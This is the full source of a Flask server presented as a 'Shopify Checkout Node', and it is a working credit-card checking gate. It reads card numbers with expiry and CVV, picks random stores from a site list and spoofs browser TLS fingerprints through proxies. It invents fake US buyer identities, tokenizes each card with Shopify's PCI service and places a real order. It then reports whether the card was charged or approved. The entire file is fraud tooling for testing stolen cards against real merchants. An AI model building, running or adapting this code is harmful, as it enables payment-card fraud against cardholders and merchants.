"""
app.py — Shopify Checkout Node (Render / scale plan)
=====================================================
Single Flask server. Runs 1 gunicorn worker × N threads so /health
worker counts are accurate across concurrent requests.
"""

import os
import re
import html
import json
import time
import uuid
import random
import string
import threading
import urllib3
from urllib.parse import urlencode

from flask import Flask, request, jsonify
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# ⚙️ ENV
# ─────────────────────────────────────────────────────────────────────────────
WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))
SITE_FILE   = os.environ.get("SITE_FILE", "site.txt")

# ─────────────────────────────────────────────────────────────────────────────
# ⚡ WORKER COUNTER  +  DEBUG STORE
# ─────────────────────────────────────────────────────────────────────────────
_workers_busy = 0
_workers_lock = threading.Lock()

def _inc_busy():
    global _workers_busy
    with _workers_lock: _workers_busy += 1

def _dec_busy():
    global _workers_busy
    with _workers_lock: _workers_busy = max(0, _workers_busy - 1)

_last_failure = {}   # ← FIX: filled on each PAYMENT failure

# ─────────────────────────────────────────────────────────────────────────────
# ⚡ TLS FINGERPRINTS
# ─────────────────────────────────────────────────────────────────────────────
BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "edge101", "safari15_5"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]

# ─────────────────────────────────────────────────────────────────────────────
# 🎭 US IDENTITIES
# ─────────────────────────────────────────────────────────────────────────────
FIRST_NAMES   = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles"]
LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com"]

ADDRESSES = [
    {"street":"100 SW Main St",           "city":"Portland",  "state":"OR","zip":"97204","phone":"+15035550100"},
    {"street":"223 Pioneer Blvd",         "city":"Salem",     "state":"OR","zip":"97301","phone":"+15035550101"},
    {"street":"101 N Last Chance Gulch",  "city":"Helena",    "state":"MT","zip":"59601","phone":"+14065550100"},
    {"street":"1 Granite St",             "city":"Concord",   "state":"NH","zip":"03301","phone":"+16035550100"},
    {"street":"100 W 10th St",            "city":"Wilmington","state":"DE","zip":"19801","phone":"+13025550100"},
]

def _identity():
    fn = random.choice(FIRST_NAMES)
    ln = random.choice(LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    a = random.choice(ADDRESSES)
    return fn, ln, email, a

def _street_addr(fn, ln, a):
    return {
        "address1":    a["street"],
        "city":        a["city"],
        "countryCode": "US",
        "postalCode":  a["zip"],
        "firstName":   fn,
        "lastName":    ln,
        "zoneCode":    a["state"],
        "phone":       a["phone"],
    }

def _rand_suffix(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# ─────────────────────────────────────────────────────────────────────────────
# 🔌 PROXY
# ─────────────────────────────────────────────────────────────────────────────
def _parse_proxy(s):
    if not s: return ""
    p = s.strip()
    for scheme in ("socks5://","socks5h://","http://","https://"):
        if p.startswith(scheme):
            p = p[len(scheme):]; break
    if "@" in p: return f"socks5h://{p}"
    parts = p.split(":")
    if len(parts) == 2: return f"socks5h://{parts[0]}:{parts[1]}"
    if len(parts) >= 4:
        host, port, user = parts[0], parts[1], parts[2]
        pw = ":".join(parts[3:])
        return f"socks5h://{user}:{pw}@{host}:{port}"
    return f"socks5h://{p}"

# ─────────────────────────────────────────────────────────────────────────────
# 🔍 BASIC EXTRACTIONS
# ─────────────────────────────────────────────────────────────────────────────
def _session_token(h):
    for pat in (
        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
        r'"sessionToken"\s*:\s*"([^"]+)"',
    ):
        m = re.search(pat, h)
        if m:
            t = html.unescape(m.group(1)).strip('"\'')
            if len(t) > 50: return t
    return ""

def _commit_sha(h):
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', html.unescape(h)); return m.group(1) if m else ""

def _stable_id(h):
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', html.unescape(h)); return m.group(1) if m else ""

def _queue_token(body):
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', body); return m.group(1) if m else ""

def _receipt_id(body):
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', body); return m.group(1) if m else ""

def _receipt_session(body):
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', body); return m.group(1) if m else ""

def _code(body):
    m = re.search(r'"code"\s*:\s*"([^"]+)"', body); return m.group(1) if m else ""

# ─────────────────────────────────────────────────────────────────────────────
# 🔍 RICH EXTRACTIONS
# ─────────────────────────────────────────────────────────────────────────────
def _signed_handles(body):
    try:
        d = json.loads(body)
        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
               .get("result",{}).get("sellerProposal",{}))
        de = sp.get("deliveryExpectations",{})
        if de.get("__typename") == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations",[]) if x.get("signedHandle")]
    except Exception:
        pass
    return []

def _delivery_handle(body):
    try:
        d = json.loads(body)
        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
               .get("result",{}).get("sellerProposal",{}))
        sds = sp.get("selectedDeliveryStrategy",{})
        if isinstance(sds, dict) and sds.get("handle"):
            return sds["handle"]
        for dg in sp.get("deliveryGroups",[]):
            for opt in dg.get("deliveryOptions",[]):
                if isinstance(opt, dict) and opt.get("handle"):
                    return opt["handle"]
    except Exception:
        pass
    for pat in (
        r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*"handle"\s*:\s*"([^"]+)"',
        r'"__typename"\s*:\s*"CompleteDeliveryStrategy"[^{}]*"handle"\s*:\s*"([^"]+)"',
    ):
        m = re.search(pat, body)
        if m: return m.group(1)
    return ""

def _checkout_total(body):
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""

def _tax_amount(body):
    try:
        d = json.loads(body)
        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
               .get("result",{}).get("sellerProposal",{}))
        return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
    except Exception:
        return "0.0"

def _tax_from_rejected(submit_body):
    try:
        d = json.loads(submit_body)
        sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
        return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
    except Exception:
        return "0.0"

def _total_from_rejected(submit_body):
    try:
        d = json.loads(submit_body)
        sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
        for k in ("checkoutTotal","total","runningTotal"):
            v = sp.get(k,{}).get("value",{}).get("amount")
            if v: return v
    except Exception:
        pass
    return ""

# ═══ FIX: robust payment-method extraction (tries many field names) ═══
def _payment_method_id(body):
    """
    Returns the payment method identifier, prioritising 'shopify_payments'.
    Tries, in order:
      1. paymentMethodIdentifier  (camelCase, canonical)
      2. payment_method_identifier (snake_case)
      3. identifier/handle/id  on any 'Payment*' or 'DirectPayment*' typename
    """
    # Try JSON walk first
    try:
        data = json.loads(body)
    except Exception:
        # Regex-only fallback
        for pat in (
            r'"paymentMethodIdentifier"\s*:\s*"([^"]{4,})"',
            r'"payment_method_identifier"\s*:\s*"([^"]{4,})"',
        ):
            m = re.search(pat, body)
            if m: return m.group(1)
        return ""

    candidates = []
    def walk(o, ctx=""):
        if isinstance(o, dict):
            tn   = str(o.get("__typename",""))
            name = str(o.get("name","")).lower()

            # Priority 0: canonical camelCase
            v = o.get("paymentMethodIdentifier")
            if isinstance(v, str) and len(v) > 3:
                candidates.append((0, "shopify" in name, v))

            # Priority 1: snake_case
            v = o.get("payment_method_identifier")
            if isinstance(v, str) and len(v) > 3:
                candidates.append((1, "shopify" in name, v))

            # Priority 2: only inside a Payment-shaped object
            if "payment" in tn.lower() or "payment" in ctx.lower():
                for k in ("identifier","handle","paymentMethodId","id"):
                    v = o.get(k)
                    if isinstance(v, str) and len(v) > 3 and not v.startswith("gid:"):
                        candidates.append((2, ("shopify" in name) or ("card" in name), v))
                        break

            for k, v in o.items():
                walk(v, tn or ctx)
        elif isinstance(o, list):
            for x in o: walk(x, ctx)

    walk(data)
    if not candidates:
        return ""
    candidates.sort(key=lambda c: (c[0], not c[1]))
    return candidates[0][2]

# ═══ FIX: HTML fallback — search checkout page for identifier ═══
def _payment_method_id_from_html(h):
    h = h.replace('&quot;','"').replace('&#34;','"')
    for pat in (
        r'"paymentMethodIdentifier"\s*:\s*"([^"]{4,})"',
        r'"payment_method_identifier"\s*:\s*"([^"]{4,})"',
        r'paymentMethodId["\']?\s*[:=]\s*["\']([^"\']{4,})["\']',
    ):
        m = re.search(pat, h)
        if m: return m.group(1)
    return ""

# ═══ FIX: digital product detection ═══
def _is_shipping_required(body):
    try:
        d = json.loads(body)
        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
               .get("result",{}).get("sellerProposal",{}))
        return sp.get("isShippingRequired", True)
    except Exception:
        return True

# ─────────────────────────────────────────────────────────────────────────────
# 🔑 GRAPHQL IDS
# ─────────────────────────────────────────────────────────────────────────────
def _graphql_ids(session, shop_url, checkout_html, ua):
    m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    if not m: return None, None, None
    try:
        js = session.get(shop_url + m.group(1), headers={"user-agent": ua}, timeout=8).text
        p = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
        s = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
        q = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"', js)
        return (p.group(1) if p else None, s.group(1) if s else None, q.group(1) if q else None)
    except Exception:
        return None, None, None

# ─────────────────────────────────────────────────────────────────────────────
# 🛍️ CHEAPEST PRODUCT
# ─────────────────────────────────────────────────────────────────────────────
def _cheapest_product(session, shop_url, ua, timeout=8):
    for ep in (
        f"{shop_url}/products.json?limit=250",
        f"{shop_url}/collections/all/products.json?limit=250",
    ):
        try:
            r = session.get(ep, headers={"user-agent": ua}, timeout=timeout)
            if r.status_code != 200: continue
            data = r.json()
            best_price = float("inf"); best_vid = None; best_pstr = ""
            for p in data.get("products", []):
                for v in p.get("variants", []):
                    if not v.get("available"): continue
                    try: price = float(str(v.get("price","0")).replace(",","."))
                    except Exception: continue
                    if price > 0 and price < best_price:
                        best_price = price
                        best_vid   = str(v.get("id"))
                        best_pstr  = str(v.get("price","")) or str(best_price)
            if best_vid: return best_vid, best_pstr
        except Exception:
            continue
    return None, None

# ─────────────────────────────────────────────────────────────────────────────
# 🛒 PROPOSAL PAYLOAD (with `lines` fix)
# ─────────────────────────────────────────────────────────────────────────────
def _proposal_payload(session_token, stable_id, variant_id, amount, currency,
                      email, addr, proposal_id):
    if addr:
        sa   = _street_addr(addr["fn"], addr["ln"], addr)
        dest = {"partialStreetAddress": {
            "address1": sa["address1"], "city": sa["city"], "countryCode": "US",
            "lastName": sa["lastName"], "phone": "", "oneTimeUse": False,
        }}
        bill = {"streetAddress": sa}
    else:
        dest = {"partialStreetAddress": {
            "address1":"","city":"","countryCode":"US","lastName":"","phone":"","oneTimeUse":False,
        }}
        bill = None

    payment = {"totalAmount": {"any": True}, "paymentLines": []}
    if bill: payment["billingAddress"] = bill

    return {
        "variables": {
            "sessionInput": {"sessionToken": session_token},
            "queueToken":   None,
            "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": dest,
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments":              {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes":    ["SHIPPING"],
                    "expectedTotalPrice":     {"any": True},
                    "destinationChanged":     True,
                }],
                "noDeliveryRequired":    [],
                "useProgressiveRates":   False,
                "supportsSplitShipping": True,
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {"lines": [{                             # ← FIX
                "stableId": stable_id,
                "merchandise": {"productVariantReference": {
                    "id":        f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                }},
                "quantity":           {"items": {"value": 1}},
                "expectedTotalPrice": {"value": {"amount": amount, "currencyCode": currency}},
            }]},
            "memberships": {"memberships": []},
            "payment":     payment,
            "buyerIdentity": {
                "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
                "email":            email or None,
                "emailChanged":     bool(email),
                "phoneCountryCode": "US",
                "marketingConsent": [],
                "rememberMe":       False,
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
        },
        "operationName": "Proposal",
        "id": proposal_id,
    }

# ─────────────────────────────────────────────────────────────────────────────
# 🔑 PCI
# ─────────────────────────────────────────────────────────────────────────────
def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua):
    try:
        r = session.post(
            "https://checkout.pci.shopifyinc.com/sessions",
            json={
                "credit_card": {
                    "number": ccn, "month": int(mm), "year": int(yyyy),
                    "verification_value": cvv, "name": name,
                },
                "payment_session_scope": shop_domain,
            },
            headers={"origin":"https://checkout.pci.shopifyinc.com","user-agent":ua},
            timeout=8,
        )
        if r.status_code == 200: return r.json().get("id")
    except Exception:
        pass
    return None

# ─────────────────────────────────────────────────────────────────────────────
# 📤 RESPONSE HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def _resp(response, *, charged=False, approved=False, price="0 USD", elapsed_ms=None):
    d = {
        "Response": response,
        "Gate":     "Shopify Payments",
        "Charged":  "True" if charged  else "False",
        "Approved": "True" if approved else "False",
        "Price":    price,
        "success":  charged or approved,
    }
    if elapsed_ms is not None: d["Time"] = str(int(elapsed_ms))
    return jsonify(d)

def _classify_failed(code):
    c = (code or "").upper()
    if "INSUFFICIENT" in c or c == "FUNDS":   return "INSUFFICIENT_FUNDS", True,  False
    if "GENERIC" in c:                        return "GENERIC_ERROR",      False, False
    if "EXPIRED" in c:                        return "CARD_EXPIRED",       False, False
    if "INVALID" in c:                        return "INVALID_CARD",       False, False
    if "BLOCKED" in c:                        return "BLOCKED_CARD",       False, False
    if "DECLINED" in c or "DO_NOT_HONOR" in c:return "CARD_DECLINED",      False, False
    return (c or "CARD_DECLINED"), False, False

# ─────────────────────────────────────────────────────────────────────────────
# 🧠 CHECK PIPELINE
# ─────────────────────────────────────────────────────────────────────────────
def _run_check(card_str, proxy_str):
    global _last_failure
    t_start = time.monotonic()
    def remain(): return BUDGET_SEC - (time.monotonic() - t_start)

    parts = card_str.split("|")
    if len(parts) < 4: return _resp("INVALID_CARD")
    ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    yyyy = "20" + yy if len(yy) == 2 else yy

    try:
        with open(SITE_FILE, "r") as f:
            sites = [l.strip() for l in f if l.strip()]
    except Exception:
        sites = []
    if not sites: return _resp("PROPOSAL_FAILED")

    shop_url  = random.choice(sites)
    proxy_url = _parse_proxy(proxy_str)
    ua        = random.choice(USER_AGENTS)
    imp       = random.choice(BROWSER_PROFILES)

    session = requests.Session(impersonate=imp)
    if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        # ── 1. Cheapest product ────────────────────────────────────────────
        vid, price = _cheapest_product(session, shop_url, ua, timeout=min(8, max(3, remain())))
        if not vid: return _resp("PROPOSAL_FAILED")
        if remain() < 28: return _resp("PROPOSAL_FAILED")

        # ── 2. Cart → Checkout ─────────────────────────────────────────────
        try:
            r = session.get(
                f"{shop_url}/cart/{vid}:1",
                headers={"user-agent": ua},
                allow_redirects=True, timeout=min(10, max(3, remain())),
            )
        except Exception: return _resp("CART_FAILED")
        if r.status_code != 200: return _resp("CART_FAILED")

        checkout_url  = r.url
        checkout_html = r.text
        cart_token    = (re.search(r'/checkouts/cn/([^/?]+)', checkout_url) or [None, ""])[1]

        session_token = _session_token(checkout_html)
        commit_sha    = _commit_sha(checkout_html)
        stable_id     = _stable_id(checkout_html)
        if not (session_token and commit_sha and stable_id):
            return _resp("MISSING_STABLE_ID")
        if remain() < 24: return _resp("PROPOSAL_FAILED")

        # ── 3. GraphQL IDs ─────────────────────────────────────────────────
        prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua)
        prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
        submit_id = submit_id or "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
        poll_id   = poll_id   or "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"

        currency = "USD"
        m = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', checkout_html)
        if m: currency = m.group(1)

        amount = price
        m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', checkout_html)
        if m: amount = m.group(1)

        # ── 4. Identity ────────────────────────────────────────────────────
        fn, ln, email, addr_raw = _identity()
        addr = {"fn":fn,"ln":ln,"street":addr_raw["street"],"city":addr_raw["city"],
                "state":addr_raw["state"],"zip":addr_raw["zip"],"phone":addr_raw["phone"]}

        hdr = {
            "accept":                       "application/json",
            "content-type":                 "application/json",
            "origin":                       shop_url,
            "referer":                      checkout_url,
            "shopify-checkout-client":      "checkout-web/1.0",
            "shopify-checkout-source":      f'id="{cart_token}", type="cn"',
            "user-agent":                   ua,
            "x-checkout-one-session-token": session_token,
            "x-checkout-web-build-id":      commit_sha,
        }
        prop_url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"

        # ── 4a. Proposal 1 (empty) ────────────────────────────────────────
        try:
            p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id)
            r1 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
        except Exception: return _resp("PROPOSAL_FAILED")
        if r1.status_code != 200: return _resp("PROPOSAL_FAILED")
        queue_token = _queue_token(r1.text) or None
        if remain() < 18: return _resp("PROPOSAL_FAILED")

        # ── 4b. Proposal 2 (email) ────────────────────────────────────────
        try:
            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id)
            p["variables"]["queueToken"] = queue_token
            r2 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
        except Exception: return _resp("PROPOSAL_FAILED")
        if r2.status_code != 200: return _resp("PROPOSAL_FAILED")

        # ── 4c. Proposal 3 (address) ──────────────────────────────────────
        try:
            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id)
            p["variables"]["queueToken"] = queue_token
            r3 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
        except Exception: return _resp("PROPOSAL_FAILED")
        if r3.status_code != 200: return _resp("PROPOSAL_FAILED")

        # ═══ FIX: collect best-of from all proposal bodies ═══
        bodies = [r3.text]
        pm_id      = _payment_method_id(r3.text)
        del_h      = _delivery_handle(r3.text)
        signed     = _signed_handles(r3.text)
        tax        = _tax_amount(r3.text)
        amount_f   = _checkout_total(r3.text) or amount
        queue_token = _queue_token(r3.text) or queue_token

        shipping_required = _is_shipping_required(r3.text)

        # ═══ FIX: make up to 3 extra proposals to trigger payment availability ═══
        for extra in range(3):
            have_all = pm_id and (signed or not shipping_required) and (del_h or not shipping_required)
            if have_all:
                break
            if remain() < 10:
                break
            time.sleep(0.05)
            try:
                p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id)
                p["variables"]["queueToken"] = queue_token
                rN = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
                if rN.status_code != 200:
                    continue
                bodies.append(rN.text)

                nq = _queue_token(rN.text)
                if nq: queue_token = nq
                np = _payment_method_id(rN.text)
                if np: pm_id = np
                ns = _signed_handles(rN.text)
                if ns: signed = ns
                nd = _delivery_handle(rN.text)
                if nd: del_h = nd
                nt = _tax_amount(rN.text)
                if nt and nt != "0.0": tax = nt
                na = _checkout_total(rN.text)
                if na: amount_f = na
            except Exception:
                continue

        # ═══ FIX: HTML fallback for payment method ═══
        if not pm_id:
            pm_id = _payment_method_id_from_html(checkout_html)

        # ═══ FIX: capture debug snapshot on failure ═══
        if not pm_id:
            last_body = bodies[-1] if bodies else ""
            _last_failure = {
                "site":     shop_url,
                "card_prefix": ccn[:6] + "******",
                "proposals": len(bodies),
                "shipping_required": shipping_required,
                "last_len": len(last_body),
                "last_snippet": last_body[:2000],
                "found_pm_keys": [k for k in (
                    "paymentMethodIdentifier","payment_method_identifier","directPaymentMethod"
                ) if k in last_body],
            }
            return _resp("PAYMENTS_CREDIT_CARD_NOT_AVAILABLE")

        if shipping_required and (not signed or not del_h):
            return _resp("PROPOSAL_FAILED")
        if remain() < 8: return _resp("PROPOSAL_FAILED")

        # ── 5. PCI ─────────────────────────────────────────────────────────
        sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua)
        if not sid: return _resp("PCI_FAILED")
        if remain() < 6: return _resp("PCI_FAILED")

        # ── 6. Submit ──────────────────────────────────────────────────────
        sa        = _street_addr(fn, ln, addr_raw)
        price_str = f"{amount_f} {currency}"

        def _build_submit(cur_tax, cur_total):
            return {
                "variables": {
                    "input": {
                        "sessionInput": {"sessionToken": session_token},
                        "queueToken":   queue_token,
                        "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": {
                            "deliveryLines": [{
                                "destination": {"streetAddress": sa},
                                "selectedDeliveryStrategy": {
                                    "deliveryStrategyByHandle": {"handle": del_h, "customDeliveryRate": False},
                                    "options": {},
                                },
                                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                                "deliveryMethodTypes":    ["SHIPPING"] if shipping_required else ["NONE"],
                                "expectedTotalPrice":     {"any": True},
                                "destinationChanged":     False,
                            }],
                            "noDeliveryRequired":    [],
                            "useProgressiveRates":   False,
                            "supportsSplitShipping": True,
                        },
                        "deliveryExpectations": {
                            "deliveryExpectationLines": [{"signedHandle": h} for h in signed],
                        },
                        "merchandise": {"lines": [{          # ← FIX
                            "stableId": stable_id,
                            "merchandise": {"productVariantReference": {
                                "id":        f"gid://shopify/ProductVariantMerchandise/{vid}",
                                "variantId": f"gid://shopify/ProductVariant/{vid}",
                            }},
                            "quantity":           {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True},
                        }]},
                        "memberships": {"memberships": []},
                        "payment": {
                            "totalAmount": {"value": {"amount": cur_total, "currencyCode": currency}},
                            "paymentLines": [{
                                "paymentMethod": {
                                    "directPaymentMethod": {
                                        "sessionId":               sid,
                                        "paymentMethodIdentifier": pm_id,   # ← FIX
                                        "billingAddress":          {"streetAddress": sa},
                                        "cardSource":              None,
                                    }
                                },
                                "amount": {"value": {"amount": cur_total, "currencyCode": currency}},
                            }],
                            "billingAddress": {"streetAddress": sa},
                        },
                        "buyerIdentity": {
                            "customer":         {"presentmentCurrency": currency, "countryCode": "US"},
                            "email":            email,
                            "emailChanged":     False,
                            "phoneCountryCode": "US",
                            "marketingConsent": [],
                            "rememberMe":       False,
                        },
                        "taxes": {
                            "proposedTotalAmount": {"value": {"amount": cur_tax, "currencyCode": currency}},
                        },
                    },
                    "attemptToken": f"{cart_token}-{_rand_suffix()}",
                    "metafields":   [],
                    "analytics": {"requestUrl": checkout_url, "pageId": str(uuid.uuid4())},
                },
                "operationName": "SubmitForCompletion",
                "id": submit_id,
            }

        # ═══ FIX: submit with tax retry ═══
        body    = ""
        cur_tax = tax or "0.0"
        cur_tot = amount_f
        for tax_attempt in range(2):
            try:
                r_submit = session.post(
                    f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                    json=_build_submit(cur_tax, cur_tot), headers=hdr,
                    timeout=min(10, max(3, remain())),
                )
                body = r_submit.text
            except Exception:
                return _resp("PROPOSAL_FAILED")

            if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in body and tax_attempt == 0:
                nt = _tax_from_rejected(body)
                nT = _total_from_rejected(body)
                if nt: cur_tax = nt
                if nT: cur_tot = nT
                price_str = f"{cur_tot} {currency}"
                continue
            break

        elapsed_ms = (time.monotonic() - t_start) * 1000

        # ── 7. Interpret ───────────────────────────────────────────────────
        if '"ProcessedReceipt"' in body or '"SuccessfulReceipt"' in body:
            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)

        if '"ActionRequiredReceipt"' in body:
            return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)

        if '"FailedReceipt"' in body:
            resp, apv, chg = _classify_failed(_code(body))
            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)

        if '"ProcessingReceipt"' in body:
            rid = _receipt_id(body)
            rss = _receipt_session(body)
            if rid and rss and remain() > 4:
                for _ in range(6):
                    if remain() < 3: break
                    time.sleep(0.4)
                    try:
                        params = {
                            "operationName": "PollForReceipt",
                            "variables": json.dumps({"receiptId": rid, "sessionToken": rss}),
                            "id": poll_id,
                        }
                        r_p = session.get(
                            f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}",
                            headers=hdr, timeout=min(8, max(2, remain())),
                        )
                        pb = r_p.text
                        if '"SuccessfulReceipt"' in pb or '"ProcessedReceipt"' in pb:
                            ms = (time.monotonic() - t_start) * 1000
                            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
                        if '"ActionRequiredReceipt"' in pb:
                            ms = (time.monotonic() - t_start) * 1000
                            return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=ms)
                        if '"FailedReceipt"' in pb:
                            resp, apv, chg = _classify_failed(_code(pb))
                            ms = (time.monotonic() - t_start) * 1000
                            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
                    except Exception:
                        continue
            return _resp("PROCESSING_TIMEOUT", price=price_str, elapsed_ms=elapsed_ms)

        code = _code(body)
        if code:
            resp, apv, chg = _classify_failed(code)
            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)

        return _resp("PROPOSAL_FAILED", price=price_str, elapsed_ms=elapsed_ms)

    except Exception as e:
        return _resp(f"ERROR_{str(e)[:40]}")
    finally:
        try: session.close()
        except Exception: pass

# ─────────────────────────────────────────────────────────────────────────────
# 🌐 ROUTES
# ─────────────────────────────────────────────────────────────────────────────
@app.route("/")
def route_check():
    _inc_busy()
    try:
        card  = request.args.get("card")
        proxy = request.args.get("proxy", "")
        if not card: return _resp("MISSING_CARD")
        return _run_check(card, proxy)
    except Exception as e:
        return _resp(f"ERROR_{str(e)[:40]}")
    finally:
        _dec_busy()

@app.route("/health")
def route_health():
    with _workers_lock: busy = _workers_busy
    return jsonify({"status":"ok","workers_busy":busy,"workers_cap":WORKERS_CAP})

# ═══ FIX: diagnostic endpoint ═══
@app.route("/debug")
def route_debug():
    return jsonify(_last_failure if _last_failure else {"ok": "no failure recorded yet"})

# ─────────────────────────────────────────────────────────────────────────────
# ▶️ ENTRY
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"[NODE] starting on 0.0.0.0:{port} cap={WORKERS_CAP} budget={BUDGET_SEC}s", flush=True)
    app.run(host="0.0.0.0", port=port, threaded=True)
